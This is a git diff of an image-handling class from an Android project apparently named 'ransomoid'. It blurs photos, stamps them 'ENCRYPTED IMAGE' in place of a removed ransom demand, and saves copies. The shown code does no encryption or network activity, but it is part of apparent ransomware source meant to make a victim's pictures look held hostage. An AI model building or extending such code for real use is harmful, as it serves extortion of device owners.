@@ -1,5 +1,6 @@
 package falezza.fabio.ransomoid.utils;
 
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.res.Resources;
 import android.graphics.Bitmap;
@@ -13,7 +14,11 @@ import android.renderscript.Element;
 import android.renderscript.RenderScript;
 import android.renderscript.ScriptIntrinsicBlur;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
 
 /**
  * Created by fabio on 31/01/18.
@@ -22,19 +27,22 @@ import java.io.File;
 public class ImageProcessor {
     private static final int blurFactor = 1000;
     private static final float BLUR_RADIUS = 25f;
-    private static final String message = "If you want back this picture you have to pay, BITCH!";
+    private static final String message = "ENCRYPTED IMAGE";
+    @SuppressLint("StaticFieldLeak")
     private static ImageProcessor instance;
     private Bitmap image;
     private File file;
     private Context context;
+    private final RenderScript renderScript;
 
     private ImageProcessor(Context context) {
         this.context = context;
+        this.renderScript = RenderScript.create(this.context);
     }
 
     public static ImageProcessor getInstance(Context context) {
         if (instance == null) {
-            return new ImageProcessor(context);
+            instance = new ImageProcessor(context);
         }
         return instance;
     }
@@ -58,11 +66,9 @@ public class ImageProcessor {
         if (null == this.image) return;
 
         Bitmap outputBitmap = Bitmap.createBitmap(this.image);
-        final RenderScript renderScript = RenderScript.create(this.context);
         Allocation tmpIn = Allocation.createFromBitmap(renderScript, this.image);
         Allocation tmpOut = Allocation.createFromBitmap(renderScript, outputBitmap);
-
-        //Intrinsic Gausian blur filter
+        //Intrinsic Gaussian blur filter
         ScriptIntrinsicBlur theIntrinsic = ScriptIntrinsicBlur.create(renderScript, Element.U8_4(renderScript));
         theIntrinsic.setRadius(BLUR_RADIUS);
         theIntrinsic.setInput(tmpIn);
@@ -80,12 +86,12 @@ public class ImageProcessor {
         Bitmap mutableBitmap = this.image.copy(Bitmap.Config.ARGB_8888, true);
 
         Canvas canvas = new Canvas(mutableBitmap);
-        // new antialised Paint
+        // new antialias Paint
         Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
         // text color - #3D3D3D
         paint.setColor(Color.rgb(61, 61, 61));
         // text size in pixels
-        paint.setTextSize((int) (14 * scale));
+        paint.setTextSize((int) (20 * scale));
         // text shadow
         paint.setShadowLayer(1f, 0f, 1f, Color.WHITE);
 
@@ -98,6 +104,16 @@ public class ImageProcessor {
         canvas.drawText(message, x, y, paint);
 
         this.image = mutableBitmap.copy(Bitmap.Config.ARGB_8888, false);
+    }
+
+    public void saveCopy() throws IOException {
+        FileProcessor fileProcessor = FileProcessor.getInstance();
+        ByteArrayOutputStream stream = new ByteArrayOutputStream();
+        this.image.compress(Bitmap.CompressFormat.JPEG, 50, stream);
+        FileOutputStream fos = new FileOutputStream(fileProcessor.getCopyName(this.file));
+        fos.write(stream.toByteArray());
+        fos.close();
+        stream.close();
     }
 
     public File getFile() {
